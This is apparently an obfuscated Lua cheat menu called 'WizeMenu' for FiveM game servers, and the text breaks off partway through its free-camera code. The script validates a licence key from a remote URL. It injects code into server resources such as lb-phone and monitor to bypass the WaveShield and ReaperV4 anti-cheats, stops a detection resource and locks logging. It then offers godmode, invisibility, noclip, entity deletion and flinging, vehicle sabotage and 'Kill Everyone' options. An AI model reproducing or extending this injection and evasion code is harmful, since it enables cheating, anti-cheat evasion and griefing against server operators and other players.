local v0="https://raw.githack.com/WM5M/test/refs/heads/main/wmk.json";local v1=MachoWebRequest(v0);local v2=MachoAuthenticationKey();local function v3() if  not v1 then return false;end local v64,v65=pcall(json.decode,v1);if ( not v64 or  not v65 or (type(v65)~="table")) then return false;end for v228,v229 in ipairs(v65) do if (v229.key==v2) then return true;end end return false;end if  not v3() then local v230=1941 -(550 + 1391) ;while true do if (v230==(0 -0)) then MachoMenuNotification("WizeMenu","Your key ain't valid lmfao: "   .. v2 ,15 -5 );return;end end end Citizen.CreateThread(function() local v66=0;local v67;local v68;while true do if (v66==(1784 -(599 + 1185))) then v67,v68=pcall(json.decode,v1);if (v67 and v68 and (type(v68)=="table")) then for v335,v336 in ipairs(v68) do if ((v336.key==v2) and v336.expires) then local v354,v355,v356,v357,v358,v359=string.match(v336.expires,"([%d]+)-([%d]+)-([%d]+)T([%d]+):([%d]+):([%d]+)Z");if (v354 and v355 and v356 and v357 and v358 and v359) then local v379=0 + 0 ;local v380;while true do if (v379==(0 + 0)) then v380="Your key is valid. Enjoy!";MachoMenuNotification("WizeMenu",v380,579 -(507 + 67) );break;end end end break;end end end break;end end end);local v4=vec2(2499 -(1013 + 736) ,500);local v5=vec2(414 + 86 ,1208 -708 );local v6=550 -400 ;local v7=10;local v8=882 -(550 + 317) ;local v9=v4.x-v6 ;local v10=v4.y-((2 -0) * v7) ;local v11=(v9-(v7 * 3))/2 ;local v12=(v10-(v7 * (3 -0)))/(5 -3) ;local v13=MachoMenuTabbedWindow("WIZEMenu",v5.x,v5.y,v4.x,v4.y,v6);MachoMenuSetKeybind(v13,33);MachoMenuSetAccent(v13,492 -(134 + 151) ,1681 -(970 + 695) ,32);MachoMenuText(v13,"YT @JayThaaGamer");local v14=MachoMenuAddTab(v13,"Self");local v15=MachoMenuAddTab(v13,"Server");local v16=MachoMenuAddTab(v13,"Teleport");local v17=MachoMenuAddTab(v13,"Weapon");local v18=MachoMenuAddTab(v13,"Vehicle");local v19=MachoMenuAddTab(v13,"Animations");local v20=MachoMenuAddTab(v13,"Triggers");local v21=MachoMenuAddTab(v13,"Settings");local v22=MachoMenuAddTab(v13,"Purchase VIP");local function v23(v69) local v70=0 -0 ;local v71;local v72;local v73;local v74;local v75;local v76;local v77;local v78;while true do if (v70==(1993 -(582 + 1408))) then v77=MachoMenuGroup(v69,"Model Changer",v74,v72,v74 + v11 ,v72 + v12 );v78=MachoMenuGroup(v69,"Functions",v74,v73,v74 + v11 ,v73 + v12 );v70=13 -9 ;end if (v70==(2 -0)) then v75=(v12 * 2) + v7 ;v76=MachoMenuGroup(v69,"Self",v71,v72,v71 + v11 ,v72 + v75 );v70=3;end if (v70==(0 -0)) then v71=v6 + v7 ;v72=v7 + v8 ;v70=1825 -(1195 + 629) ;end if (4==v70) then return v76,v77,v78;end if (v70==1) then v73=v72 + v12 + v7 ;v74=v71 + v11 + v7 ;v70=2 -0 ;end end end local function v24(v79) local v80=241 -(187 + 54) ;local v81;local v82;local v83;local v84;local v85;local v86;local v87;while true do if ((782 -(162 + 618))==v80) then v85=v83 + v7 ;v86=v85 + v81 ;v80=3 + 0 ;end if (v80==(1 + 0)) then v83=v82 + v81 ;v84=MachoMenuGroup(v79,"Player",v82,v7 + v8 ,v83,v10);v80=2;end if (v80==(6 -3)) then v87=MachoMenuGroup(v79,"Everyone",v85,v7 + v8 ,v86,v10);return v84,v87;end if (v80==(0 -0)) then v81=(v9-(v7 * 3))/2 ;v82=v6 + v7 ;v80=1;end end end local function v25(v88) local v89=0;local v90;local v91;local v92;local v93;local v94;local v95;local v96;while true do if ((1 + 0)==v89) then v92=v91 + v90 ;v93=MachoMenuGroup(v88,"Teleport",v91,v7 + v8 ,v92,v10);v89=1638 -(1373 + 263) ;end if (v89==(1000 -(451 + 549))) then v90=(v9-(v7 * (1 + 2)))/2 ;v91=v6 + v7 ;v89=1;end if (3==v89) then v96=MachoMenuGroup(v88,"Other",v94,v7 + v8 ,v95,v10);return v93,v96;end if (v89==(2 -0)) then v94=v92 + v7 ;v95=v94 + v90 ;v89=3;end end end local function v26(v97) local v98=0 -0 ;local v99;local v100;local v101;local v102;local v103;local v104;while true do if (v98==(1385 -(746 + 638))) then v101=v100 + v12 + v7 ;v102=MachoMenuGroup(v97,"Mods",v99,v100,v99 + v11 ,v100 + v12 );v98=1 + 1 ;end if (v98==(0 -0)) then v99=v6 + v7 ;v100=v7 + v8 ;v98=342 -(218 + 123) ;end if (v98==3) then return v102,SectionTwo,v104;end if (v98==(1583 -(1535 + 46))) then v103=v99 + v11 + v7 ;v104=MachoMenuGroup(v97,"Other",v103,v7 + v8 ,v103 + v11 ,v10);v98=3 + 0 ;end end end local function v27(v105) local v106=v6 + v7 ;local v107=v7 + v8 ;local v108=v107 + v12 + v7 ;local v109=MachoMenuGroup(v105,"Mods",v106,v107,v106 + v11 ,v107 + v12 );local v110=MachoMenuGroup(v105,"Plate & Spawning",v106,v108,v106 + v11 ,v108 + v12 );local v111=v106 + v11 + v7 ;local v112=MachoMenuGroup(v105,"Other",v111,v7 + v8 ,v111 + v11 ,v10);return v109,v110,v112;end local function v28(v113) local v114=0 + 0 ;local v115;local v116;local v117;local v118;local v119;local v120;local v121;while true do if (v114==(561 -(306 + 254))) then v117=v116 + v115 ;v118=MachoMenuGroup(v113,"Animations",v116,v7 + v8 ,v117,v10);v114=1 + 1 ;end if (v114==(0 -0)) then v115=(v9-(v7 * (1470 -(899 + 568))))/(2 + 0) ;v116=v6 + v7 ;v114=1;end if (v114==3) then v121=MachoMenuGroup(v113,"Force Emotes",v119,v7 + v8 ,v120,v10);return v118,v121;end if (v114==(4 -2)) then v119=v117 + v7 ;v120=v119 + v115 ;v114=606 -(268 + 335) ;end end end local function v29(v122) local v123=0;local v124;local v125;local v126;local v127;local v128;local v129;while true do if (v123==2) then v128=v124 + v11 + v7 ;v129=MachoMenuGroup(v122,"Common Exploits",v128,v125,v128 + v11 ,v125 + v12 );v123=293 -(60 + 230) ;end if (v123==(575 -(426 + 146))) then return v127,SectionTwo,v129,SectionFour;end if (v123==0) then v124=v6 + v7 ;v125=v7 + v8 ;v123=1 + 0 ;end if (v123==(1457 -(282 + 1174))) then v126=v125 + v12 + v7 ;v127=MachoMenuGroup(v122,"Money Spawner",v124,v125,v124 + v11 ,v125 + v12 );v123=2;end end end local function v30(v130) local v131=v6 + v7 ;local v132=v7 + v8 ;local v133=v132 + v12 + v7 ;local v134=MachoMenuGroup(v130,"UPGRADE TO PRO",v131,v132,v131 + v11 ,v132 + v12 );local v135=v131 + v11 + v7 ;return v134,SectionTwo,SectionThree;end local function v31(v136) local v137=0;local v138;local v139;local v140;local v141;local v142;local v143;local v144;while true do if (v137==(813 -(569 + 242))) then v142=MachoMenuGroup(v136,"Menu Design",v138,v140,v138 + v11 ,v140 + v12 );v143=v138 + v11 + v7 ;v137=3;end if (v137==(2 -1)) then v140=v139 + v12 + v7 ;v141=MachoMenuGroup(v136,"Stop",v138,v139,v138 + v11 ,v139 + v12 );v137=1 + 1 ;end if (v137==(1027 -(706 + 318))) then v144=MachoMenuGroup(v136,"Server Settings",v143,v7 + v8 ,v143 + v11 ,v10);return v141,v142,v144;end if (v137==0) then v138=v6 + v7 ;v139=v7 + v8 ;v137=1;end end end local v32={v23(v14)};local v33={v24(v15)};local v34={v25(v16)};local v35={v26(v17)};local v36={v27(v18)};local v37={v28(v19)};local v38={v29(v20)};local v39={v30(v22)};local v40={v31(v21)};local function v41(v145) return GetResourceState(v145)=="started" ;end local function v42() Wait(1500);MachoMenuNotification("[NOTIFICATION] WizeMenu","Loading Spawn Bypass.");MachoInjectResourceRaw("lb-phone",[[
    local function runLbPhoneBypass()
        CreateThread(function()
            print('[^1CrackV^0] ^3Loading lb-phone patch bypass...^0')

            while not _G.CreateFrameworkVehicle do
                Wait(0)
            end

            local lbPhoneCFV = _G.CreateFrameworkVehicle

            while true do
                if lbPhoneCFV ~= _G.CreateFrameworkVehicle then
                    _G.CreateFrameworkVehicle = lbPhoneCFV

                    print('[^WizeMenu^0] ^2Loaded WizeMenu Spawn bypass^0')
                end

                Wait(0)
            end
        end)
    end

    runLbPhoneBypass()
]]);MachoMenuNotification("[NOTIFICATION] WizeMenu","Loading WaveSHIT Bypass.");MachoInjectResourceRaw("monitor",[[
    local function SafeWrap(setFunc)
        return function(...)
            return setFunc(...)
        end
    end

    local SafeThread = SafeWrap(CreateThread)
    local SafeCVehicle = SafeWrap(CreateVehicle)
    local SafeCTrigger = SafeWrap(TriggerEvent)
    local SafeSTrigger = SafeWrap(TriggerServerEvent)

    SafeThread(function()
        SafeCVehicle('bmx', GetEntityCoords(PlayerPedId()), 0.0, true, false)
        print('JayThaaGamer')
        SafeCTrigger('esx_ambulancejob:revive')
        --SafeSTrigger('SERVER_EVENT')
    end)
]]);local function v146() local function v231(v243,v244) local v245=LoadResourceFile(v243,v244);return v245~=nil ;end local v232="ai_module_fg-obfuscated.lua";local v233=GetNumResources();for v246=0,v233-(1289 -(993 + 295))  do local v247=GetResourceByFindIndex(v246);if v231(v247,v232) then return true,v247;end end return false,nil;end Wait(6 + 94 );local v147,v148=v146();if (v147 and v148) then MachoResourceStop(v148);end Wait(1271 -(418 + 753) );MachoMenuNotification("[NOTIFICATION] WizeMenu","Finalizing.");Wait(191 + 309 );MachoMenuNotification("[NOTIFICATION] WizeMenu","Finished Enjoy.");end v42();local v43;if (GetResourceState("qbx_core")=="started") then v43="qbx_core";elseif (GetResourceState("es_extended")=="started") then v43="es_extended";elseif (GetResourceState("qb-core")=="started") then v43="qb-core";else v43="any";end Citizen.CreateThread(function() local v149=0;while true do if ((1 + 0)==v149) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Finished. Enjoy!");break;end if (v149==(0 + 0)) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Finalizing.");Wait(127 + 373 );v149=1;end end end);MachoLockLogger();MachoInjectResource((v41("core") and "core") or (v41("es_extended") and "es_extended") or (v41("qb-core") and "qb-core") or (v41("monitor") and "monitor") or "any" ,[[
    local xJdRtVpNzQmKyLf = false -- Free Camera
]]);MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
    Unloaded = false
    local aXfPlMnQwErTyUi = false -- Godmode
    local sRtYuIoPaSdFgHj = false -- Invisibility
    local mKjHgFdSaPlMnBv = false -- No Ragdoll
    local uYtReWqAzXcVbNm = false -- Infinite Stamina
    local peqCrVzHDwfkraYZ = false -- Shrink Ped
    local NpYgTbUcXsRoVm = false -- No Clip
    local xCvBnMqWeRtYuIo = false -- Super Jump
    local nxtBFlQWMMeRLs = false -- Levitation
    local fgawjFmaDjdALaO = false -- Super Strength
    local qWeRtYuIoPlMnBv = false -- Super Punch
    local zXpQwErTyUiPlMn = false -- Throw From Vehicle
    local kJfGhTrEeWqAsDz = false -- Force Third Person
    local zXcVbNmQwErTyUi = false -- Force Driveby
    local yHnvrVNkoOvGMWiS = false -- Anti-Headshot
    local nHgFdSaZxCvBnMq = false -- Anti-Freeze
    local fAwjeldmwjrWkSf = false -- Anti-TP
    local aDjsfmansdjwAEl = false -- Anti-Blackscreen
    local qWpEzXvBtNyLmKj = false -- Crosshair

    local egfjWADmvsjAWf = false -- Spoofed Weapon Spawning
    local LkJgFdSaQwErTy = false -- Infinite Ammo
    local QzWxEdCvTrBnYu = false -- Explosive Ammo
    local RfGtHyUjMiKoLp = false -- One Shot Kill 

    local zXcVbNmQwErTyUi = false -- Vehicle Godmode
    local RNgZCddPoxwFhmBX = false -- Force Vehicle Engine
    local PlAsQwErTyUiOp = false -- Vehicle Auto Repair
    local LzKxWcVbNmQwErTy = false -- Freeze Vehicle
    local NuRqVxEyKiOlZm = false -- Vehicle Hop
    local GxRpVuNzYiTq = false -- Rainbow Vehicle
    local MqTwErYuIoLp = false -- Drift Mode
    local NvGhJkLpOiUy = false -- Easy Handling
    local VkLpOiUyTrEq = false -- Instant Breaks
    local BlNkJmLzXcVb = false -- Unlimited Fuel

    local aSwDeFgHiJkLoPx = false -- Normal Kill Everyone
    local qWeRtYuIoPlMnAb = false -- Permanent Kill Everyone
    local tUOgshhvIaku = false -- RPG Kill Everyone
    local zXcVbNmQwErTyUi = false -- 
]]);MachoMenuCheckbox(v32[530 -(406 + 123) ],"Godmode",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if aXfPlMnQwErTyUi == nil then aXfPlMnQwErTyUi = false end
        aXfPlMnQwErTyUi = true

        local function OxWJ1rY9vB()
            local fLdRtYpLoWqEzXv = CreateThread
            fLdRtYpLoWqEzXv(function()
                while aXfPlMnQwErTyUi and not Unloaded do
                    local dOlNxGzPbTcQ = PlayerPedId()
                    local rKsEyHqBmUiW = PlayerId()

                    if GetResourceState("ReaperV4") == "started" then
                        local kcWsWhJpCwLI = SetPlayerInvincible
                        local ByTqMvSnAzXd = SetEntityInvincible
                        kcWsWhJpCwLI(rKsEyHqBmUiW, true)
                        ByTqMvSnAzXd(dOlNxGzPbTcQ, true)

                    elseif GetResourceState("WaveShield") == "started" then
                        local cvYkmZYIjvQQ = SetEntityCanBeDamaged
                        cvYkmZYIjvQQ(dOlNxGzPbTcQ, false)

                    else
                        local BiIqUJHexRrR = SetEntityCanBeDamaged
                        local UtgGRNyiPhOs = SetEntityProofs
                        local rVuKoDwLsXpC = SetEntityInvincible

                        BiIqUJHexRrR(dOlNxGzPbTcQ, false)
                        UtgGRNyiPhOs(dOlNxGzPbTcQ, true, true, true, false, true, false, false, false)
                        rVuKoDwLsXpC(dOlNxGzPbTcQ, true)
                    end

                    Wait(0)
                end
            end)
        end

        OxWJ1rY9vB()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        aXfPlMnQwErTyUi = false

        local dOlNxGzPbTcQ = PlayerPedId()
        local rKsEyHqBmUiW = PlayerId()

        if GetResourceState("ReaperV4") == "started" then
            local kcWsWhJpCwLI = SetPlayerInvincible
            local ByTqMvSnAzXd = SetEntityInvincible

            kcWsWhJpCwLI(rKsEyHqBmUiW, false)
            ByTqMvSnAzXd(dOlNxGzPbTcQ, false)

        elseif GetResourceState("WaveShield") == "started" then
            local AilJsyZTXnNc = SetEntityCanBeDamaged
            AilJsyZTXnNc(dOlNxGzPbTcQ, true)

        else
            local tBVAZMubUXmO = SetEntityCanBeDamaged
            local yuTiZtxOXVnE = SetEntityProofs
            local rVuKoDwLsXpC = SetEntityInvincible

            tBVAZMubUXmO(dOlNxGzPbTcQ, true)
            yuTiZtxOXVnE(dOlNxGzPbTcQ, false, false, false, false, false, false, false, false)
            rVuKoDwLsXpC(dOlNxGzPbTcQ, false)
        end
    ]]);end);MachoMenuCheckbox(v32[1770 -(1749 + 20) ],"Invisibility",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
        sRtYuIoPaSdFgHj = true

        local function d2NcWoyTfb()
            if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
            sRtYuIoPaSdFgHj = true

            local zXwCeVrBtNuMyLk = CreateThread
            zXwCeVrBtNuMyLk(function()
                while sRtYuIoPaSdFgHj and not Unloaded do
                    local uYiTpLaNmZxCwEq = SetEntityVisible
                    local hGfDrEsWxQaZcVb = PlayerPedId()
                    uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, false, false)
                    Wait(0)
                end

                local uYiTpLaNmZxCwEq = SetEntityVisible
                local hGfDrEsWxQaZcVb = PlayerPedId()
                uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
            end)
        end

        d2NcWoyTfb()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        sRtYuIoPaSdFgHj = false

        local function tBKM4syGJL()
            local uYiTpLaNmZxCwEq = SetEntityVisible
            local hGfDrEsWxQaZcVb = PlayerPedId()
            uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
        end

        tBKM4syGJL()
    ]]);end);MachoMenuCheckbox(v32[1],"No Ragdoll",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if mKjHgFdSaPlMnBv == nil then mKjHgFdSaPlMnBv = false end
        mKjHgFdSaPlMnBv = true

        local function jP7xUrK9Ao()
            local zVpLyNrTmQxWsEd = CreateThread
            zVpLyNrTmQxWsEd(function()
                while mKjHgFdSaPlMnBv and not Unloaded do
                    local oPaSdFgHiJkLzXc = SetPedCanRagdoll
                    oPaSdFgHiJkLzXc(PlayerPedId(), false)
                    Wait(0)
                end
            end)
        end

        jP7xUrK9Ao()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        mKjHgFdSaPlMnBv = false
    ]]);end);MachoMenuCheckbox(v32[1],"Infinite Stamina",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if uYtReWqAzXcVbNm == nil then uYtReWqAzXcVbNm = false end
        uYtReWqAzXcVbNm = true

        local function YLvd3pM0tB()
            local tJrGyHnMuQwSaZx = CreateThread
            tJrGyHnMuQwSaZx(function()
                while uYtReWqAzXcVbNm and not Unloaded do
                    local aSdFgHjKlQwErTy = RestorePlayerStamina
                    local rTyUiEaOpAsDfGhJk = PlayerId()
                    aSdFgHjKlQwErTy(rTyUiEaOpAsDfGhJk, 1.0)
                    Wait(0)
                end
            end)
        end

        YLvd3pM0tB()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        uYtReWqAzXcVbNm = false
    ]]);end);MachoMenuCheckbox(v32[1],"Tiny Ped",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if peqCrVzHDwfkraYZ == nil then peqCrVzHDwfkraYZ = false end
        peqCrVzHDwfkraYZ = true

        local function YfeemkaufrQjXTFY()
            local OLZACovzmAvgWPmC = CreateThread
            OLZACovzmAvgWPmC(function()
                while peqCrVzHDwfkraYZ and not Unloaded do
                    local aukLdkvEinBsMWuA = SetPedConfigFlag
                    aukLdkvEinBsMWuA(PlayerPedId(), 223, true)
                    Wait(0)
                end
            end)
        end

        YfeemkaufrQjXTFY()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        peqCrVzHDwfkraYZ = false
        local aukLdkvEinBsMWuA = SetPedConfigFlag
        aukLdkvEinBsMWuA(PlayerPedId(), 223, false)
    ]]);end);MachoMenuCheckbox(v32[1 + 0 ],"No Clip",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
        NpYgTbUcXsRoVm = true

        local function KUQpH7owdz()
            local RvBcNxMzKgUiLo = PlayerPedId
            local EkLpOiUhYtGrFe = GetVehiclePedIsIn
            local CtVbXnMzQaWsEd = GetEntityCoords
            local DrTgYhUjIkOlPm = GetEntityHeading
            local QiWzExRdCtVbNm = GetGameplayCamRelativeHeading
            local AoSdFgHjKlZxCv = GetGameplayCamRelativePitch
            local JkLzXcVbNmAsDf = IsDisabledControlJustPressed
            local TyUiOpAsDfGhJk = IsDisabledControlPressed
            local WqErTyUiOpAsDf = SetEntityCoordsNoOffset
            local PlMnBvCxZaSdFg = SetEntityHeading
            local HnJmKlPoIuYtRe = CreateThread

            local YtReWqAzXsEdCv = false

            HnJmKlPoIuYtRe(function()
                while NpYgTbUcXsRoVm and not Unloaded do
                    Wait(0)

                    if JkLzXcVbNmAsDf(0, 303) then
                        YtReWqAzXsEdCv = not YtReWqAzXsEdCv
                    end

                    if YtReWqAzXsEdCv then
                        local speed = 2.0

                        local p = RvBcNxMzKgUiLo()
                        local v = EkLpOiUhYtGrFe(p, false)
                        local inVeh = v ~= 0 and v ~= nil
                        local ent = inVeh and v or p

                        local pos = CtVbXnMzQaWsEd(ent, true)
                        local head = QiWzExRdCtVbNm() + DrTgYhUjIkOlPm(ent)
                        local pitch = AoSdFgHjKlZxCv()

                        local dx = -math.sin(math.rad(head))
                        local dy = math.cos(math.rad(head))
                        local dz = math.sin(math.rad(pitch))
                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                        if len ~= 0 then
                            dx, dy, dz = dx / len, dy / len, dz / len
                        end

                        if TyUiOpAsDfGhJk(0, 21) then speed = speed + 2.5 end
                        if TyUiOpAsDfGhJk(0, 19) then speed = 0.25 end

                        if TyUiOpAsDfGhJk(0, 32) then
                            pos = pos + vector3(dx, dy, dz) * speed
                        end
                        if TyUiOpAsDfGhJk(0, 34) then
                            pos = pos + vector3(-dy, dx, 0.0) * speed
                        end
                        if TyUiOpAsDfGhJk(0, 269) then
                            pos = pos - vector3(dx, dy, dz) * speed
                        end
                        if TyUiOpAsDfGhJk(0, 9) then
                            pos = pos + vector3(dy, -dx, 0.0) * speed
                        end
                        if TyUiOpAsDfGhJk(0, 22) then
                            pos = pos + vector3(0.0, 0.0, speed)
                        end
                        if TyUiOpAsDfGhJk(0, 36) then
                            pos = pos - vector3(0.0, 0.0, speed)
                        end

                        WqErTyUiOpAsDf(ent, pos.x, pos.y, pos.z, true, true, true)
                        PlMnBvCxZaSdFg(ent, head)
                    end
                end
                YtReWqAzXsEdCv = false
            end)
        end

        KUQpH7owdz()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        NpYgTbUcXsRoVm = false
    ]]);end);MachoMenuCheckbox(v32[1],"Free Camera",function() MachoInjectResource((v41("core") and "core") or (v41("es_extended") and "es_extended") or (v41("qb-core") and "qb-core") or (v41("monitor") and "monitor") or "any" ,[[
        
        g_FreecamFeatureEnabled = true
        
        local function initializeFreecam()
            -- Script State
            local isFreecamActive = false
            local freecamHandle = nil
            local targetCoords, targetEntity = nil, nil
            local currentFeatureIndex = 1

            -- NEW FEATURE: Ped Spawning State
            local pedsToSpawn = { "s_m_m_movalien_01", "u_m_y_zombie_01", "s_m_y_blackops_01", "csb_abigail", "a_c_coyote" }
            local currentPedIndex = 1

            local stopFreecam, startFreecam

            -- Feature Definitions (Now with Ped Spawner)
            local Features = { 
                "Look-Around", 
                "Spawn Ped",         -- ADDED
                "Teleport", 
                "Delete Entity", 
                "Fling Entity", 
                "Flip Vehicle", 
                "Launch Vehicle",
                "Teleport Vehicle",
                "Mess With Vehicle"
            }

            -- Helper Function for Drawing Text
            local function drawText(content, x, y, options)
                SetTextFont(options.font or 4)
                SetTextScale(0.0, options.scale or 0.3)
                SetTextColour(options.color[1], options.color[2], options.color[3], options.color[4])
                SetTextOutline()
                if options.shadow then SetTextDropShadow(2, 0, 0, 0, 255) end
                SetTextCentre(true)
                BeginTextCommandDisplayText("STRING")
                AddTextComponentSubstringPlayerName(content)
                EndTextCommandDisplayText(x, y)
            end

            -- Main Draw Thread (UI Only)
            local function drawThread()
                while isFreecamActive do
                    Wait(0)
                    -- Draw Crosshair
                    drawText("•", 0.5, 0.485, {font = 4, scale = 0.5, color = {255,255,255,200}})
                    
                    -- ##### UI FIX: SCROLLING MENU LOGIC #####
                    local ui = { x = 0.5, y = 0.75, lineHeight = 0.03, maxVisible = 7, colors = { text = {245, 245, 245, 120}, selected = {52, 152, 219, 255} } }
                    local numFeatures = #Features
                    local startIdx, endIdx = 1, numFeatures

                    if numFeatures > ui.maxVisible then
                        startIdx = math.max(1, currentFeatureIndex - math.floor(ui.maxVisible / 2))
                        endIdx = math.min(numFeatures, startIdx + ui.maxVisible - 1)
                        if endIdx == numFeatures then
                            startIdx = numFeatures - ui.maxVisible + 1
                        end
                    end

                    -- Draw a counter above the list
                    drawText(("%d/%d"):format(currentFeatureIndex, numFeatures), ui.x, ui.y - 0.035, {scale = 0.25, color = {255,255,255,120}})

                    local displayCount = 0
                    for i = startIdx, endIdx do
                        local featureName = Features[i]
                        local isSelected = (i == currentFeatureIndex)
                        local lineY = ui.y + (displayCount * ui.lineHeight)
                        if isSelected then
                            drawText(("[ %s ]"):format(featureName), ui.x, lineY, {scale = 0.32, color = ui.colors.selected, shadow = true})
                        else
                            drawText(featureName, ui.x, lineY, {scale = 0.28, color = ui.colors.text})
                        end
                        displayCount = displayCount + 1
                    end
                end
            end

            -- Main Input and Logic Thread
            local function logicThread()
                while isFreecamActive do
                    Wait(0)
                    if IsDisabledControlJustPressed(0, 241) then currentFeatureIndex = (currentFeatureIndex - 2 + #Features) % #Features + 1 elseif IsDisabledControlJustPressed(0, 242) then currentFeatureIndex = (currentFeatureIndex % #Features) + 1 end
                    
                    if IsDisabledControlJustPressed(0, 24) then -- Action Key Pressed
                        local currentFeature = Features[currentFeatureIndex]
                        if currentFeature == "Teleport" and targetCoords then
                            local ped = PlayerPedId()
                            local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false)
                            SetEntityCoords(ped, targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z, false, false, false, true)
                        -- ##### NEW FEATURE: SAFE PED SPAWNER LOGIC #####
                        elseif currentFeature == "Spawn Ped" and targetCoords then
                            local model = pedsToSpawn[currentPedIndex]
                            CreateThread(function()
                                local modelHash = GetHashKey(model)
                                RequestModel(modelHash)
                                local timeout = 2000 -- 2 second timeout for model loading
                                while not HasModelLoaded(modelHash) and timeout > 0 do
                                    Wait(100)
                                    timeout = timeout - 100
                                end
                                if HasModelLoaded(modelHash) then
                                    local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z, false)
                                    local spawnPos = vector3(targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z)
                                    local newPed = CreatePed(4, modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, true)
                                    SetModelAsNoLongerNeeded(modelHash)
                                    TaskStandStill(newPed, -1) -- Make them stand still
                                    currentPedIndex = (currentPedIndex % #pedsToSpawn) + 1 -- Cycle to the next ped for next time
                                end
                            end)
                        elseif currentFeature == "Delete Entity" and targetEntity and DoesEntityExist(targetEntity) then
                            SetEntityAsMissionEntity(targetEntity, true, true)
                            DeleteEntity(targetEntity)
                        elseif currentFeature == "Fling Entity" and targetEntity and (IsEntityAPed(targetEntity) or IsEntityAVehicle(targetEntity)) then
                            ApplyForceToEntity(targetEntity, 1, math.random(-50.0, 50.0), math.random(-50.0, 50.0), 50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                        elseif currentFeature == "Flip Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            SetVehicleOnGroundProperly(targetEntity)
                        elseif currentFeature == "Launch Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            ApplyForceToEntity(targetEntity, 1, 0.0, 0.0, 100.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                        elseif currentFeature == "Teleport Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            local currentCoords = GetEntityCoords(targetEntity)
                            local newCoords = currentCoords + GetEntityForwardVector(targetEntity) * 5.0 + vector3(0.0, 0.0, 50.0)
                            SetEntityCoords(targetEntity, newCoords.x, newCoords.y, newCoords.z, false, false, false, true)
                        elseif currentFeature == "Mess With Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            local actions = {
                                function(veh) SetVehicleTyreBurst(veh, math.random(0, 5), false, 1000.0) end,
                                function(veh) SetVehicleDoorOpen(veh, math.random(0, 5), false, false) end,
                                function(veh) SetVehicleEngineOn(veh, not IsVehicleEngineOn(veh), false, true) end,
                                function(veh) SetVehicleLights(veh, math.random(0, 2)) end,
                                function(veh) StartVehicleHorn(veh, 1000, "HELDDOWN", false) end
                            }
                            local randomAction = actions[math.random(#actions)]
                            randomAction(targetEntity)
                        end
                    end
                end
            end

            -- Main Camera Movement Thread (Unchanged)
            local function cameraThread()
                local baseSpeed, boostSpeed, slowSpeed = 1.0, 9.0, 0.1; local mouseSensitivity = 7.5; local function clamp(val, min, max) return math.max(min, math.min(max, val)) end; local function rotToDir(rot) local rX, rZ = math.rad(rot.x), math.rad(rot.z); return vector3(-math.sin(rZ)*math.cos(rX), math.cos(rZ)*math.cos(rX), math.sin(rX)) end;
                while isFreecamActive do
                    Wait(0)
                    local camPos, camRotRaw = GetCamCoord(freecamHandle), GetCamRot(freecamHandle, 2); local camRot = { x = camRotRaw.x, y = camRotRaw.y, z = camRotRaw.z }; local direction = rotToDir(camRot); local right = vector3(direction.y, -direction.x, 0)
                    local speed = baseSpeed; if IsDisabledControlPressed(0, 21) then speed = boostSpeed end; if IsDisabledControlPressed(0, 19) then speed = slowSpeed end
                    if IsDisabledControlPressed(0, 32) then camPos = camPos + direction * speed end; if IsDisabledControlPressed(0, 33) then camPos = camPos - direction * speed end; if IsDisabledControlPressed(0, 34) then camPos = camPos - right * speed end; if IsDisabledControlPressed(0, 35) then camPos = camPos + right * speed end; if IsDisabledControlPressed(0, 22) then camPos = camPos + vector3(0, 0, 1.0) * speed end; if IsDisabledControlPressed(0, 36) then camPos = camPos - vector3(0, 0, 1.0) * speed end
                    local mX, mY = GetControlNormal(0,1)*mouseSensitivity, GetControlNormal(0,2)*mouseSensitivity; camRot.x = clamp(camRot.x-mY, -89.0, 89.0); camRot.z = camRot.z-mX
                    SetCamCoord(freecamHandle, camPos.x, camPos.y, camPos.z); SetCamRot(freecamHandle, camRot.x, camRot.y, camRot.z, 2); SetFocusPosAndVel(camPos.x, camPos.y, camPos.z, 0.0, 0.0, 0.0)
